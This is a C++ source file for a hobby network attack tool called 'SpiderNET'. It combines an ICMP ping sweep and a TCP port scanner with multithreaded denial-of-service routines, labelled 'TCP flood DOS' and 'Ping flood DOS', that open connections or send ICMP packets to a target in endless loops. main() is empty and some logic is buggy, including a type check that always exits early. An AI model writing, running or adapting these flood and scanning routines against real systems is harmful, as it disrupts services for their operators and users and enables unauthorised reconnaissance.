#include <netdb.h>
#include<stdlib.h>
#include<stdio.h>
#include <cstring>
#include<iostream>
#include<sys/socket.h>
#include<arpa/inet.h>
#include <unistd.h>
#include <vector>
#include <thread>
#include <netinet/ip_icmp.h>
#include <sys/time.h>
#include <math.h>


 /*
 * Math calc binary - RFC 1071 IP/ICMP/UDP/TCP
 *  @param b Pointer to the data buffer.
 *  @param len Buffer size in bytes.
 *  @return 16-bit checksum with one's complement.
 */
unsigned short checksum(void *b, int len) {    
    unsigned short *buf = (unsigned short *)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;

    if (len == 1)
        sum += *(unsigned char *)buf;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

bool ip_response(const char *ip){
    //Reformular depois===========================================================
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    
    if (sock < 0)
    {
        fprintf(stderr, "You are not sudo \n");
        return false;
    }
    
    // Timeout 
    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);

    // Target
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    inet_pton(AF_INET, ip, &target.sin_addr);


    // ICMP package  
    char package[64];
    memset(package, 0, sizeof(package));

    struct icmphdr *icmp = (struct icmphdr*)package;

    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = htons(1234);
    icmp->un.echo.sequence = htons(1);

    //Calc checksum 
    icmp->checksum = checksum(package, sizeof(struct icmphdr));

    // Sendto <- send package send without internet
    sendto(sock, package, sizeof(struct icmphdr), 0, (struct sockaddr*)&target, sizeof(target));

    // Respost from timeout
    char buffer_respost[1024];
    struct sockaddr_in sender;
    socklen_t len = sizeof(sender);

    int bytes = recvfrom(sock, buffer_respost, sizeof(buffer_respost), 0, (struct sockaddr*)&sender, &len );
    close(sock);


    return bytes < 0 ?  false : true; 

}

bool scanPort(const char  *ip, int port){
  
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        return false;
    }
 
    struct sockaddr_in host;
    host.sin_family = AF_INET;
    host.sin_port = htons(port);
    inet_pton(AF_INET, ip, &host.sin_addr);

    int connection = connect(sock, (struct sockaddr*)&host, sizeof(host));

    if(connection < 0){
        return false;
    }
    else{
        return true;
    }

    close(sock);
}

void scan_all(const char *ip, std::vector<int> ports){
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    for(int i = 0; i < ports.size(); i ++ ){
    
        if(scanPort(ip, ports[i]) == true){

            printf("[*] Open port: %i in host: %s \n", ports[i], ip );
        }
        else{
            
            printf("[*] Port: %i in host: %s closed \n", ports[i], ip );
        }

    }
    
}

void scan_all(const char *ip){
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    
    for(int i = 0; i <= 65535; i ++){
        if(scanPort(ip, i ) ==true ){
            printf("[*] Open port: %i int host: %s \n",i, ip );
        }            
    }
    
}
void show_ips(const char * ip_range, int CIDR ){
    int const_aux = 0; 

    for(int i = 24; i <= 30; i ++){
        if(i == CIDR){
            const_aux = pow(2, (32 - CIDR)) -2 ;
            break;      
        }
    }
    char base_network [20];
    strcpy(base_network, ip_range); 
    
    // Corta a string logo após o último ponto
    char *delimiter = strrchr(base_network, '.');
    if (delimiter != NULL) {
         *(delimiter + 1) = '\0'; 
    }

    printf("[*] Scanning network: %s0/%i \n", base_network, CIDR);
    printf("[*] Total hosts to scan: %d \n", const_aux);
    printf("[*] Searching... \n");

    for(int i = 1; i <= const_aux; i ++){
        char ip_loop[INET_ADDRSTRLEN];
        sprintf(ip_loop, "%s%d", base_network, i);
        
        if(ip_response(ip_loop) == 1){
            printf("- %s", ip_loop );

        }
    
    }


}


void payloadHost(char *buffer, int size){
    struct hostent *hostInfo;
    hostInfo = gethostbyname(buffer);
    char ipChar[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, hostInfo->h_addr,ipChar, INET_ADDRSTRLEN );
    
    std::string ip(ipChar);
    // making payload
    strncpy(buffer, ip.c_str(), 15);
    buffer[14] = '\0';

}
 /*
 * TCp flood DOS
 */
void tcp_flood( const char *ip, int port){
    struct sockaddr_in host;
    host.sin_family = AF_INET;
    host.sin_port = htons(port);
    inet_pton(AF_INET, ip, &host.sin_addr);

    while(true) { 

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        connect(sock, (struct sockaddr*)&host, sizeof(host));
        
        close(sock);
        
    }
}

/*
* Ping flood DOS
*/
void ping_flood(const char *ip, int size){

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    inet_pton(AF_INET, ip, &target.sin_addr);

    int big_spider = sizeof(struct icmphdr) + size;   
    char *package = new char[big_spider];
    memset(package, 'X', big_spider);

    struct icmphdr *icmp = (struct icmphdr *)package;
    icmp->type = ICMP_ECHO;
    icmp->un.echo.id = htons(1234);
    icmp->un.echo.sequence = htons(1);

    icmp->checksum =0;
    icmp->checksum = checksum(package, big_spider);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
  
    if (sock < 0)
    {   
        delete[] package;
        fprintf(stderr, "[*] You are not sudo \n");
        return;
    }

    while (true)
    {
        
    sendto(sock, package, big_spider, 0, (struct sockaddr*)&target, sizeof(target));
                
    }
 
}

void dOS ( int th, const char *ip, int port, int type ){
    if( type != 1 || type != 2){
        return;
    }

   std::vector<std::thread> spiders;
   
   if(type == 1){
        printf("[*] Type %s tcp-flood ", type); 

        for(int i = 0; i < th; i ++){
        spiders.emplace_back(tcp_flood, ip, port);
        
        }
   }else{
        int size = 0;
        
        printf("[*] What number of spiders to attack ? (MAX number = 2^{16} -1 )");
        scanf("%i ", &size);
       
        if(size > 65535){
            printf("[*] Max number");
            return;
            
        }else{
            printf("[*] BIG SPIDER ATCK ");

            for(int i = 0; i < th; i ++){
                spiders.emplace_back(ping_flood, ip, size);
    
            }
            
            
            printf("");


        }
    }   
   for(auto& t : spiders){
        if(t.joinable()){
            t.join();
        }
   }
    
}

void spider(){
    printf(
    " ____        _     _           _   _ _____ _____ \n"
    "/ ___| _ __ (_) __| | ___ _ __| \\ | | ____|_   _|\n"
    "\\___ \\| '_ \\| |/ _` |/ _ \\ '__|  \\| |  _|   | |  \n"
    " ___) | |_) | | (_| |  __/ |  | |\\  | |___  | |  \n"
    "|____/| .__/|_|\\__,_|\\___|_|  |_| \\_|_____| |_|  \n"
    "      |_|                                         \n"
    );
    printf(
    "           ;               ,           \n"
    "         ,;                 '.         \n"
    "        ;:                   :;        \n"
    "       ::                     ::       \n"
    "       ::                     ::       \n"
    "       ':                     :        \n"
    "        :.                    :        \n"
    "     ;' ::                   ::  '     \n"
    "    .'  ';                   ;'  '.    \n"
    "   ::    :;                 ;:    ::   \n"
    "   ;      :;.             ,;:     ::   \n"
    "   :;      :;:           ,;\"      ::   \n"
    "   ::.      ':;  ..,.;  ;:'     ,.;:   \n"
    "    \"'\"...   '::,::::: ;:   .;.;\"\"'    \n"
    "        '\"\"\"....;:::::;,;.;\"\"\"         \n"
    "    .:::.....'\"':::::::'\",...;::::;.   \n"
    "   ;:' '\"\"'\"\";.,;:::::;.'\"\"\"\"\"\"  ':;   \n"
    "  ::'         ;::;:::;::..         :;  \n"
    " ::         ,;:::::::::::;:..       :: \n"
    " ;'     ,;;:;::::::::::::::;\";..    ':.\n"
    "::     ;:\"  ::::::\"\"\"'::::::  \":     ::\n"
    " :.    ::   ::::::;  :::::::   :     ; \n"
    "  ;    ::   :::::::  :::::::   :    ;  \n"
    "   '   ::   ::::::....:::::'  ,:   '   \n"
    "    '  ::    :::::::::::::\"   ::       \n"
    "       ::     ':::::::::\"'    ::       \n"
    "       ':       \"\"\"\"\"\"\"'      ::       \n"
    "        ::                   ;:        \n"
    "        ':;                 ;:\"        \n"
    "          ';              ,;'          \n"
    "            \"'           '\"            \n"
    "              ' \n"
    );
}


int main(){
    
  

}